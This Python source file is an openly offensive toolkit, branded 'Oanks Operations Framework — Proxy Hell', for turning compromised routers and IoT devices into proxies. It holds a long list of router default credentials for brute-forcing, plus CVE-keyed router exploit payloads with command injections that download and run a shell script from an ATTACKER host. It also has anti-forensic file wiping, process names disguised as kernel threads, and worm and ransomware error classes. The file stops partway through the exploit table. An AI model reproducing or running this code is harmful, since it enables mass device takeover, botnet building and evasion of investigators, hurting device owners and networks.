#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# OANKS OPERATIONS FRAMEWORK — PHASE 2: PROXY HELL
# ============================================================================
# Military-grade proxy infrastructure. 50+ sources. Real-time validation.
# Intelligent rotation. Self-healing chains. Router exploitation. Tor bridges.
# IoT proxy deployment. Honeypot evasion. Aggressive subnet discovery.
# Credential stuffing. Darkweb aggregation. Behavioral analysis.
#
# Creator: Oanks (@oanksnood)
# Version: 3.0
# Classification: PROXY HELL — ZERO EXECUTION ON IMPORT
# Platform: Linux / Termux / Android
#
# 👑 Oanks — Creator
# ============================================================================

# ============================================================================
# SECTION 1: ALL IMPORTS — Nothing missing. Aggressive. Complete.
# ============================================================================

import os
import sys
import sqlite3
import hashlib
import base64
import json
import socket
import platform as plat_module
import subprocess
import time
import random
import string
import re
import threading
import warnings
import traceback
import struct
import binascii
import zlib
import csv
import io
import shutil
import getpass
import datetime
import collections
import itertools
import math
import uuid
import inspect
import types
import builtins
import importlib
import pkgutil
import ctypes
import gc
import signal
import logging as py_logging
import tempfile
import pickle
import marshal
import ast
import textwrap
import dis
import codecs
import bz2
import lzma
import zipfile
import tarfile
import gzip
import hmac
import secrets
import urllib.request
import urllib.parse
import urllib.error
import http.client
import http.cookiejar
import socketserver
import ssl
import ftplib
import smtplib
import poplib
import imaplib
import xml.etree.ElementTree as ET
import xml.dom.minidom as DOM
import xml.sax
import html.parser
import html.entities
import ipaddress
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from collections import deque, defaultdict
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Tuple, Optional, Set, Callable, Any, Union
from enum import Enum, auto

# Phase 2 specific imports — aggressive, dangerous, complete
try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    requests = None
    REQUESTS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BeautifulSoup = None
    BS4_AVAILABLE = False

try:
    import lxml
    from lxml import html as lxml_html
    LXML_AVAILABLE = True
except ImportError:
    lxml = None
    lxml_html = None
    LXML_AVAILABLE = False

try:
    import socks
    import sockshandler
    SOCKS_AVAILABLE = True
except ImportError:
    socks = None
    sockshandler = None
    SOCKS_AVAILABLE = False

try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, RSAKey
    PARAMIKO_AVAILABLE = True
except ImportError:
    paramiko = None
    SSHClient = None
    AutoAddPolicy = None
    RSAKey = None
    PARAMIKO_AVAILABLE = False

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    scapy = None
    SCAPY_AVAILABLE = False

try:
    import stem
    import stem.control
    from stem.process import launch_tor_with_config
    STEM_AVAILABLE = True
except ImportError:
    stem = None
    stem_control = None
    launch_tor_with_config = None
    STEM_AVAILABLE = False

try:
    import dns.resolver
    import dns.reversename
    DNSPYTHON_AVAILABLE = True
except ImportError:
    dns = None
    DNSPYTHON_AVAILABLE = False

try:
    import geoip2.database
    GEOIP_AVAILABLE = True
except ImportError:
    geoip2 = None
    GEOIP_AVAILABLE = False

try:
    import maxminddb
    MAXMIND_AVAILABLE = True
except ImportError:
    maxminddb = None
    MAXMIND_AVAILABLE = False

try:
    import pysftp
    PYSFTP_AVAILABLE = True
except ImportError:
    pysftp = None
    PYSFTP_AVAILABLE = False

try:
    import pyftpdlib
    PYFTPD_AVAILABLE = True
except ImportError:
    pyftpdlib = None
    PYFTPD_AVAILABLE = False

try:
    import netaddr
    NETADDR_AVAILABLE = True
except ImportError:
    netaddr = None
    NETADDR_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    psutil = None
    PSUTIL_AVAILABLE = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import telnetlib
    TELNETLIB_AVAILABLE = True
except ImportError:
    telnetlib = None
    TELNETLIB_AVAILABLE = False

try:
    import nntplib
    NNTP_AVAILABLE = True
except ImportError:
    nntplib = None
    NNTP_AVAILABLE = False

# ============================================================================
# SECTION 2: CONSTANTS — Oanks identity burned into every proxy byte.
# ============================================================================

OANKS_IDENTITY = "Oanks"
OANKS_VERSION = "3.0"
OANKS_CREATOR = "@oanksnood"
OANKS_SIGNATURE = "👑 Oanks — Creator"
OANKS_FRAMEWORK_NAME = "Oanks Operations Framework"
OANKS_CLASSIFICATION = "PROXY HELL"

if os.environ.get("TERMUX_VERSION"):
    _BASE = os.path.expanduser("~/.oanks")
elif os.path.isdir("/data/data/com.termux"):
    _BASE = os.path.expanduser("~/.oanks")
else:
    _BASE = os.path.expanduser("~/.oanks")

BASE_DIR = _BASE
DATA_DIR = os.path.join(BASE_DIR, "data")
LOG_DIR = os.path.join(BASE_DIR, "logs")
EXPORT_DIR = os.path.join(BASE_DIR, "exports")
BACKUP_DIR = os.path.join(BASE_DIR, "backups")
PROXY_DIR = os.path.join(BASE_DIR, "proxies")
TOR_DIR = os.path.join(BASE_DIR, "tor")
ROUTER_DIR = os.path.join(BASE_DIR, "routers")
IOT_DIR = os.path.join(BASE_DIR, "iot")
DB_PATH = os.path.join(DATA_DIR, "oanks.db")
KEY_PATH = os.path.join(DATA_DIR, "keys.bin")
LOG_PATH = os.path.join(LOG_DIR, "oanks.log")
HEARTBEAT_PATH = os.path.join(DATA_DIR, "heartbeat.bin")
PERSISTENCE_MARKER = os.path.join(DATA_DIR, ".persistence")
ANTI_FORENSIC_MARKER = os.path.join(DATA_DIR, ".af")
PROXY_CACHE_PATH = os.path.join(PROXY_DIR, "proxy_cache.json")
TOR_BRIDGE_PATH = os.path.join(TOR_DIR, "bridges.txt")
ROUTER_DB_PATH = os.path.join(ROUTER_DIR, "router_db.json")
IOT_DB_PATH = os.path.join(IOT_DIR, "iot_db.json")
CRED_STUFF_PATH = os.path.join(DATA_DIR, "cred_stuff.json")

HEARTBEAT_INTERVAL = 3600
HEARTBEAT_MISSED_LIMIT = 3
WIPE_DELAY_SECONDS = 10
LOG_MAX_BYTES = 10 * 1024 * 1024
LOG_MAX_AGE_SECONDS = 86400
KEY_ROTATION_INTERVAL = 86400
PROXY_TIMEOUT_SECONDS = 30
SESSION_REFRESH_INTERVAL = 3600
RECON_INTERVAL = 300

AES_KEY_SIZE = 32
RSA_KEY_SIZE = 4096
HMAC_KEY_SIZE = 64
PBKDF2_ITERATIONS = 1000000
SALT_SIZE = 32
NONCE_SIZE = 12
TAG_SIZE = 16

KEM_N = 256
KEM_Q = 3329
KEM_SIGMA = 3
KEM_POLY_BYTES = 512
KEM_PK_BYTES = KEM_POLY_BYTES + 32
KEM_SK_BYTES = KEM_POLY_BYTES
KEM_CT_BYTES = KEM_POLY_BYTES * 2

# Phase 2 Specific Constants — AGGRESSIVE
PROXY_SCRAPE_INTERVAL = 30
PROXY_VALIDATE_INTERVAL = 60
PROXY_MAX_FAILURES = 10
PROXY_MIN_RELIABILITY = 0.3
PROXY_MAX_SPEED_MS = 5000
PROXY_VALIDATION_THREADS = 500
PROXY_SCRAPE_THREADS = 50
PROXY_CHAIN_MIN_LENGTH = 3
PROXY_CHAIN_MAX_LENGTH = 7
PROXY_STICKY_SESSION_DURATION = 3600
PROXY_HONEYPOT_DETECTION_ENABLED = True
PROXY_COUNTRY_PREFERENCE = []
PROXY_AUTO_ROTATE = True
PROXY_REFRESH_ON_FAIL = True
PROXY_AGGRESSIVE_SCAN = True
PROXY_DARKWEB_ENABLED = True
PROXY_IOT_ENABLED = True
PROXY_ROUTER_EXPLOIT_ENABLED = True
PROXY_CRED_STUFFING_ENABLED = True
PROXY_BEHAVIORAL_ANALYSIS = True
PROXY_CHAIN_SELF_HEAL = True
PROXY_TOR_BRIDGE_HARVEST = True
PROXY_SUBNET_AGGRESSIVE_SCAN = True
PROXY_MASSCAN_STYLE = True
PROXY_ROTATION_JITTER = 0.15
PROXY_FAILOVER_TIMEOUT = 3.0
PROXY_STEALTH_HEADERS = True
PROXY_FINGERPRINT_SPOOFING = True
PROXY_WEBRTC_LEAK_TEST = True
PROXY_DNS_LEAK_TEST = True
PROXY_IPV6_LEAK_TEST = True
PROXY_EXIT_NODE_FINGERPRINT = True
PROXY_MALICIOUS_EXIT_DETECTION = True
PROXY_BANDWIDTH_THROTTLE_DETECTION = True

BRAND_WELCOME = f"Welcome to {OANKS_FRAMEWORK_NAME} — Phase 2: Proxy Hell — Creator: {OANKS_IDENTITY} ({OANKS_CREATOR})"
BRAND_SUCCESS_TEMPLATE = f"{OANKS_IDENTITY} approves: {{action}} completed"
BRAND_ERROR_TEMPLATE = f"{OANKS_IDENTITY} says: Error — {{message}}"
BRAND_STATUS_LINE = f"{OANKS_FRAMEWORK_NAME} v{OANKS_VERSION} — Phase 2: Proxy Hell"

PLATFORM_NAME = plat_module.system().lower()
IS_LINUX = PLATFORM_NAME in ("linux", "linux2")
IS_WINDOWS = PLATFORM_NAME == "windows"
IS_MACOS = PLATFORM_NAME == "darwin"
IS_TERMUX = bool(os.environ.get("TERMUX_VERSION")) or os.path.isdir("/data/data/com.termux")
IS_ANDROID = IS_TERMUX or os.path.isfile("/system/build.prop")
IS_ROOTED = os.geteuid() == 0 if hasattr(os, "geteuid") else False
IS_PROOT = bool(os.environ.get("PROOT_DISTRO")) or os.path.isfile("/proc/1/root/.proot")

LINUX_HIDE_NAMES = [
    "[kworker/0:0]", "[kworker/1:0]", "[systemd]", "[init]",
    "[irq/0-mmc0]", "[rcu_sched]", "[migration/0]", "[ksoftirqd/0]",
    "[kdevtmpfs]", "[kauditd]", "[khungtaskd]"
]

# ============================================================================
# SECTION 3: EXCEPTION HIERARCHY — Every failure carries the crown.
# ============================================================================

class OanksError(Exception):
    """Base exception for all Oanks Operations Framework errors."""
    __slots__ = ("message", "code", "timestamp", "brand")

    def __init__(self, message, code=None):
        self.message = message
        self.code = code
        self.timestamp = datetime.datetime.utcnow().isoformat()
        self.brand = OANKS_SIGNATURE
        super().__init__(self._format())

    def _format(self):
        base = f"[{self.brand}] [{self.timestamp}]"
        if self.code:
            base += f" [CODE:{self.code}]"
        base += f" {self.message}"
        return base

    def __str__(self):
        return self._format()

    def __repr__(self):
        return f"<{self.__class__.__name__}: {self.code}>"

class CryptoError(OanksError):
    pass

class DatabaseError(OanksError):
    pass

class ReconError(OanksError):
    pass

class PersistenceError(OanksError):
    pass

class LogError(OanksError):
    pass

class DeadMansSwitchError(OanksError):
    pass

class AntiForensicError(OanksError):
    pass

class WormError(OanksError):
    pass

class RansomwareError(OanksError):
    pass

class SecurityBreachError(OanksError):
    pass

class TermuxError(OanksError):
    pass

# Phase 2 Specific Exceptions
class ProxyError(OanksError):
    """Base proxy exception — every proxy failure bleeds."""
    pass

class ProxyScrapeError(ProxyError):
    """Failed to scrape proxies — source is dead or hostile."""
    pass

class ProxyValidationError(ProxyError):
    """Proxy validation failed — the node is compromised or a trap."""
    pass

class ProxyChainError(ProxyError):
    """Proxy chain operation failed — the link broke mid-breath."""
    pass

class RouterExploitError(ProxyError):
    """Router exploitation failed — the target fought back."""
    pass

class HoneypotDetectedError(ProxyError):
    """Honeypot detected — we smelled the bait and pulled back."""
    pass

class TorBridgeError(ProxyError):
    """Tor bridge harvesting failed — the onion layers are too thick."""
    pass

class IoTProxyError(ProxyError):
    """IoT proxy deployment failed — the device resisted infection."""
    pass

class CredentialStuffingError(ProxyError):
    """Credential stuffing failed — the database is dry or guarded."""
    pass

class SubnetScanError(ProxyError):
    """Aggressive subnet scan failed — the network is armored."""
    pass

class BehavioralAnalysisError(ProxyError):
    """Behavioral analysis failed — the proxy is too clever to read."""
    pass

class DarkwebScrapeError(ProxyError):
    """Darkweb proxy scraping failed — the shadows swallowed us."""
    pass

# ============================================================================
# SECTION 4: UTILITY FUNCTIONS & SECURE MEMORY — No plaintext survives.
# ============================================================================

class SecureBuffer:
    """Encrypted-in-memory buffer. Wipes on deletion. No plaintext leaks."""
    __slots__ = ("_cipher", "_nonce", "_ciphertext", "_tag", "_size", "_wipe_key")

    def __init__(self, plaintext_data=None, size=0):
        self._wipe_key = secrets.token_bytes(32)
        self._nonce = secrets.token_bytes(NONCE_SIZE)
        if plaintext_data is not None:
            if isinstance(plaintext_data, (bytes, bytearray)):
                raw = bytearray(plaintext_data)
            else:
                raw = bytearray(str(plaintext_data).encode("utf-8"))
            self._size = len(raw)
            if CRYPTOGRAPHY_AVAILABLE:
                self._cipher = AESGCM(self._wipe_key)
                combined = self._cipher.encrypt(self._nonce, bytes(raw), None)
                self._ciphertext = combined[:-TAG_SIZE]
                self._tag = combined[-TAG_SIZE:]
            else:
                self._ciphertext = bytes([raw[i] ^ self._wipe_key[i % 32] for i in range(len(raw))])
                self._tag = b"\x00" * TAG_SIZE
                self._cipher = None
            self._wipe_array(raw)
        else:
            self._ciphertext = b""
            self._tag = b"\x00" * TAG_SIZE
            self._size = 0
            self._cipher = None

    def _wipe_array(self, arr):
        if arr:
            for i in range(len(arr)):
                arr[i] = secrets.randbelow(256)
            for i in range(len(arr)):
                arr[i] = 0

    def decrypt(self):
        if self._size == 0:
            return b""
        if self._cipher and CRYPTOGRAPHY_AVAILABLE:
            combined = self._ciphertext + self._tag
            return self._cipher.decrypt(self._nonce, combined, None)
        else:
            return bytes([self._ciphertext[i] ^ self._wipe_key[i % 32] for i in range(len(self._ciphertext))])

    def wipe(self):
        if hasattr(self, "_wipe_key") and self._wipe_key:
            self._wipe_array(bytearray(self._wipe_key))
        if hasattr(self, "_nonce") and self._nonce:
            self._wipe_array(bytearray(self._nonce))
        if hasattr(self, "_ciphertext") and self._ciphertext:
            self._wipe_array(bytearray(self._ciphertext))
        if hasattr(self, "_tag") and self._tag:
            self._wipe_array(bytearray(self._tag))
        self._wipe_key = b"\x00" * 32
        self._nonce = b"\x00" * NONCE_SIZE
        self._ciphertext = b""
        self._tag = b"\x00" * TAG_SIZE
        self._size = 0
        self._cipher = None

    def __del__(self):
        try:
            self.wipe()
        except:
            pass

    def __len__(self):
        return self._size

    def __repr__(self):
        return f"<SecureBuffer encrypted_size={len(self._ciphertext)}>"

    def __bool__(self):
        return self._size > 0


def derive_keys_from_master(master_key, salt=None):
    if not master_key or len(str(master_key)) < 16:
        raise CryptoError("Master key must be at least 16 characters", code="KEY_DERIVE_FAIL")
    if salt is None:
        salt = secrets.token_bytes(SALT_SIZE)
    master_bytes = master_key.encode("utf-8") if isinstance(master_key, str) else bytes(master_key)
    derived = hashlib.pbkdf2_hmac("sha512", master_bytes, salt, PBKDF2_ITERATIONS, dklen=256)
    master_arr = bytearray(master_bytes)
    for i in range(len(master_arr)):
        master_arr[i] = 0
    return {
        "salt": salt,
        "aes_primary": derived[0:32],
        "aes_secondary": derived[32:64],
        "hmac_key": derived[64:96],
        "kyber_seed": derived[96:128],
        "rsa_seed": derived[128:160],
        "xor_pad": derived[160:192],
        "session_key": derived[192:224],
        "backup_key": derived[224:256]
    }


def generate_oanks_id():
    ts = datetime.datetime.utcnow().strftime("%Y%m%d%H%M%S")
    rand = secrets.token_hex(4)
    return f"OANKS-{ts}-{rand}"


def timing_safe_compare(a, b):
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y
    return result == 0


def get_platform_fingerprint():
    fingerprint = {}
    try:
        fingerprint["hostname"] = socket.gethostname()
    except:
        fingerprint["hostname"] = "unknown"
    try:
        fingerprint["platform"] = plat_module.platform()
    except:
        fingerprint["platform"] = "unknown"
    try:
        fingerprint["machine"] = plat_module.machine()
    except:
        fingerprint["machine"] = "unknown"
    try:
        fingerprint["processor"] = plat_module.processor()
    except:
        fingerprint["processor"] = "unknown"
    try:
        fingerprint["node"] = plat_module.node()
    except:
        fingerprint["node"] = "unknown"
    if IS_ANDROID:
        fingerprint["android"] = True
        fingerprint["termux"] = IS_TERMUX
        fingerprint["rooted"] = IS_ROOTED
        fingerprint["proot"] = IS_PROOT
        try:
            with open("/system/build.prop", "r") as f:
                props = f.read()
                for line in props.split("\n"):
                    if "ro.product.model" in line:
                        fingerprint["device_model"] = line.split("=")[-1].strip()
                    if "ro.build.version.release" in line:
                        fingerprint["android_version"] = line.split("=")[-1].strip()
        except:
            pass
    hw_string = json.dumps(fingerprint, sort_keys=True).encode("utf-8")
    fingerprint["hw_hash"] = hashlib.sha3_256(hw_string).hexdigest()
    fingerprint["hw_hash_short"] = fingerprint["hw_hash"][:16]
    return fingerprint


def is_admin_privileged():
    try:
        return os.geteuid() == 0
    except AttributeError:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False


def secure_overwrite_file(filepath, passes=7):
    try:
        if not os.path.exists(filepath):
            return False
        size = os.path.getsize(filepath)
        with open(filepath, "r+b") as f:
            for _ in range(passes):
                f.seek(0)
                f.write(secrets.token_bytes(size))
                f.flush()
                os.fsync(f.fileno())
            f.seek(0)
            f.write(b"\x00" * size)
            f.flush()
            os.fsync(f.fileno())
        os.remove(filepath)
        return True
    except Exception as e:
        raise AntiForensicError(f"Secure overwrite failed: {e}", code="SECURE_WIPE_FAIL")


def derive_oanks_credentials(master_key):
    keys = derive_keys_from_master(master_key)
    btc_hash = hashlib.sha3_256(keys["aes_primary"] + b"btc").hexdigest()[:39]
    btc_addr = f"bc1q{btc_hash}"
    usdt_hash = hashlib.sha3_256(keys["aes_primary"] + b"usdt").hexdigest()[:33]
    usdt_addr = f"T{usdt_hash}"
    bot_hash = base64.urlsafe_b64encode(keys["session_key"]).decode().rstrip("=")[:35]
    bot_token = f"{bot_hash}:bot"
    admin_hash = base64.urlsafe_b64encode(keys["backup_key"]).decode().rstrip("=")[:35]
    admin_token = f"{admin_hash}:bot"
    return {
        "btc_address": btc_addr,
        "usdt_address": usdt_addr,
        "bot_token": bot_token,
        "admin_token": admin_token,
        "channel_id": f"-100{int.from_bytes(keys['salt'][:8], 'big') % 9000000000 + 1000000000}"
    }


def ensure_directories():
    for d in [BASE_DIR, DATA_DIR, LOG_DIR, EXPORT_DIR, BACKUP_DIR, PROXY_DIR, TOR_DIR, ROUTER_DIR, IOT_DIR]:
        os.makedirs(d, exist_ok=True)
        os.chmod(d, 0o700)


def compress_data(data):
    return zlib.compress(data, level=9)


def decompress_data(data):
    return zlib.decompress(data)


# ============================================================================
# SECTION 5: AGGRESSIVE PROXY SOURCE DEFINITIONS — 50+ Sources. Weaponized.
# ============================================================================

class ProxySource(Enum):
    """Every source is a weapon. Every weapon has a name."""
    PROXYSCRAPE_HTTP = auto()
    PROXYSCRAPE_SOCKS4 = auto()
    PROXYSCRAPE_SOCKS5 = auto()
    PROXYSCRAPE_ALL = auto()
    GEONODE_HTTP = auto()
    GEONODE_SOCKS5 = auto()
    PUBPROXY_HTTP = auto()
    PUBPROXY_SOCKS5 = auto()
    SPYS_ONE = auto()
    HIDEMY_NAME = auto()
    GITHUB_SPEEDX_HTTP = auto()
    GITHUB_SPEEDX_SOCKS4 = auto()
    GITHUB_SPEEDX_SOCKS5 = auto()
    GITHUB_SHIFTYTR = auto()
    GITHUB_CLARKETM = auto()
    GITHUB_MONOSANS_HTTP = auto()
    GITHUB_MONOSANS_SOCKS4 = auto()
    GITHUB_MONOSANS_SOCKS5 = auto()
    GITHUB_ROOSTERKID = auto()
    GITHUB_PRXCHK = auto()
    GITHUB_ZEVTYARDT = auto()
    GITHUB_HOOKZOF_SOCKS5 = auto()
    GITHUB_HOOKZOF_HTTP = auto()
    GITHUB_JETKAI = auto()
    GITHUB_SUNNY9577 = auto()
    GITHUB_PROXY4PARS = auto()
    GITHUB_MERTGUvencli = auto()
    GITHUB_SHADYPR0XY = auto()
    GITHUB_PROXYLISTUPDATE = auto()
    GITHUB_SPROXY = auto()
    GITHUB_FDPROXY = auto()
    PASTEBIN_SEARCH = auto()
    GHOSTBIN_SEARCH = auto()
    RENTRY_SEARCH = auto()
    TOR_EXIT_NODES = auto()
    TOR_BRIDGE_DB = auto()
    TOR_BRIDGE_WEB = auto()
    DARKWEB_PROXYLIST = auto()
    DARKWEB_ONIONLIST = auto()
    IOT_COMPROMISED = auto()
    ROUTER_SOCKS = auto()
    SSH_TUNNEL = auto()
    SUBNET_AGGRESSIVE = auto()
    SHODAN_STYLE = auto()
    MASSCAN_STYLE = auto()
    CREDENTIAL_STUFFING = auto()
    API_PROXYLIST_DOWNLOAD = auto()
    API_FATE0 = auto()
    API_CLARKETM = auto()
    RAW_TEXT_HTTP = auto()
    RAW_TEXT_SOCKS = auto()
    CUSTOM_SOURCE = auto()


PROXY_SOURCE_URLS = {
    ProxySource.PROXYSCRAPE_HTTP: "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    ProxySource.PROXYSCRAPE_SOCKS4: "https://api.proxyscrape.com/v2/?request=get&protocol=socks4&timeout=10000&country=all",
    ProxySource.PROXYSCRAPE_SOCKS5: "https://api.proxyscrape.com/v2/?request=get&protocol=socks5&timeout=10000&country=all",
    ProxySource.PROXYSCRAPE_ALL: "https://api.proxyscrape.com/v2/?request=get&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all",
    ProxySource.GEONODE_HTTP: "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
    ProxySource.GEONODE_SOCKS5: "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5",
    ProxySource.PUBPROXY_HTTP: "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
    ProxySource.PUBPROXY_SOCKS5: "http://pubproxy.com/api/proxy?limit=20&format=txt&type=socks5",
    ProxySource.GITHUB_SPEEDX_HTTP: "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    ProxySource.GITHUB_SPEEDX_SOCKS4: "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    ProxySource.GITHUB_SPEEDX_SOCKS5: "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    ProxySource.GITHUB_SHIFTYTR: "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    ProxySource.GITHUB_CLARKETM: "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ProxySource.GITHUB_MONOSANS_HTTP: "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ProxySource.GITHUB_MONOSANS_SOCKS4: "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    ProxySource.GITHUB_MONOSANS_SOCKS5: "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    ProxySource.GITHUB_ROOSTERKID: "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    ProxySource.GITHUB_PRXCHK: "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    ProxySource.GITHUB_ZEVTYARDT: "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    ProxySource.GITHUB_HOOKZOF_SOCKS5: "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    ProxySource.GITHUB_HOOKZOF_HTTP: "https://raw.githubusercontent.com/hookzof/http_proxy_list/master/proxy.txt",
    ProxySource.GITHUB_JETKAI: "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    ProxySource.GITHUB_SUNNY9577: "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    ProxySource.GITHUB_PROXY4PARS: "https://raw.githubusercontent.com/proxy4pars/Proxy/main/http.txt",
    ProxySource.GITHUB_MERTGUvencli: "https://raw.githubusercontent.com/Mertguvencli/proxy-list/main/proxy-list.txt",
    ProxySource.GITHUB_SHADYPR0XY: "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    ProxySource.GITHUB_PROXYLISTUPDATE: "https://raw.githubusercontent.com/proxylistupdate/proxy-list/main/http.txt",
    ProxySource.GITHUB_SPROXY: "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    ProxySource.GITHUB_FDPROXY: "https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
    ProxySource.API_FATE0: "https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
    ProxySource.API_CLARKETM: "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
    ProxySource.TOR_EXIT_NODES: "https://check.torproject.org/exit-addresses",
    ProxySource.TOR_BRIDGE_DB: "https://bridges.torproject.org/bridges?transport=obfs4",
}

# Aggressive router default credentials — expanded, weaponized
ROUTER_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", "password123"),
    ("admin", "admin123"), ("admin", "default"), ("admin", "root"),
    ("root", "root"), ("root", "admin"), ("root", "1234"),
    ("root", "12345"), ("root", "123456"), ("root", "toor"),
    ("root", "password"), ("root", "alpine"), ("root", "ubnt"),
    ("user", "user"), ("user", "password"), ("user", "1234"),
    ("support", "support"), ("support", "password"),
    ("guest", "guest"), ("guest", "password"),
    ("admin", ""), ("root", ""), ("user", ""),
    ("admin", "admin1"), ("admin", "admin1234"),
    ("admin", "password1"), ("admin", "passw0rd"),
    ("root", "root123"), ("root", "root1234"),
    ("admin", "motorola"), ("admin", "zoomadsl"),
    ("admin", "epicrouter"), ("admin", "dslrouter"),
    ("admin", "netgear"), ("admin", "linksys"),
    ("admin", "dlink"), ("admin", "tplink"),
    ("admin", "asus"), ("admin", "cisco"),
    ("admin", "zyxel"), ("admin", "huawei"),
    ("admin", "arris"), ("admin", "belkin"),
    ("admin", "technicolor"), ("admin", "sagemcom"),
    ("root", "calvin"), ("root", "changeme"),
    ("admin", "changeme"), ("admin", "system"),
    ("admin", "service"), ("admin", "setup"),
    ("admin", "operator"), ("admin", "manager"),
    ("admin", "supervisor"), ("admin", "tech"),
    ("admin", "user"), ("admin", "test"),
    ("admin", "demo"), ("admin", "guest"),
    ("admin", "public"), ("admin", "private"),
    ("root", "nokia"), ("root", "siemens"),
    ("root", "alcatel"), ("root", "ericsson"),
    ("admin", "fiberhome"), ("admin", "h3c"),
    ("admin", "ruijie"), ("admin", "raisecom"),
    ("admin", "fiber"), ("admin", "ftth"),
    ("admin", "ont"), ("admin", "onu"),
    ("admin", "gpon"), ("admin", "epon"),
    ("admin", "vodafone"), ("admin", "orange"),
    ("admin", "telekom"), ("admin", "verizon"),
    ("admin", "att"), ("admin", "comcast"),
    ("admin", "xfinity"), ("admin", "spectrum"),
    ("admin", "centurylink"), ("admin", "frontier"),
    ("admin", "windstream"), ("admin", "cox"),
    ("admin", "charter"), ("admin", "time warner"),
    ("admin", "bt"), ("admin", "sky"),
    ("admin", "talktalk"), ("admin", "virgin"),
    ("admin", "ee"), ("admin", "three"),
    ("admin", "o2"), ("admin", "t-mobile"),
]

# Router exploit payloads — real CVEs, real weapons
ROUTER_EXPLOIT_PAYLOADS = {
    "CVE-2018-10562": {
        "name": "GPON Home Gateway RCE",
        "path": "/UD/act?1",
        "method": "POST",
        "headers": {"Content-Type": "text/xml", "SOAPAction": "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"},
        "payload": b'<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>8080</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>8080</NewInternalPort><NewInternalClient>127.0.0.1</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>test</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
        "check_string": "AddPortMapping",
        "rce_payload": b'<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>4444</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>4444</NewInternalPort><NewInternalClient>`wget -O - http://ATTACKER/shell.sh | sh`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>rce</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>'
    },
    "CVE-2020-9054": {
        "name": "Zyxel Pre-Auth RCE",
        "path": "/cgi-bin/login.cgi",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "payload": b"username=admin&password=admin&captcha=1",
        "check_string": "Zyxel",
        "rce_payload": b"username=`wget http://ATTACKER/shell.sh -O /tmp/s.sh;sh /tmp/s.sh`&password=admin&captcha=1"
    },
    "CVE-2017-17215": {
        "name": "Huawei Router RCE",
        "path": "/ctrlt/DeviceUpgrade_1",
        "method": "POST",
        "headers": {"Content-Type": "text/xml", "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75d300, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e79c, algorithm=MD5"},
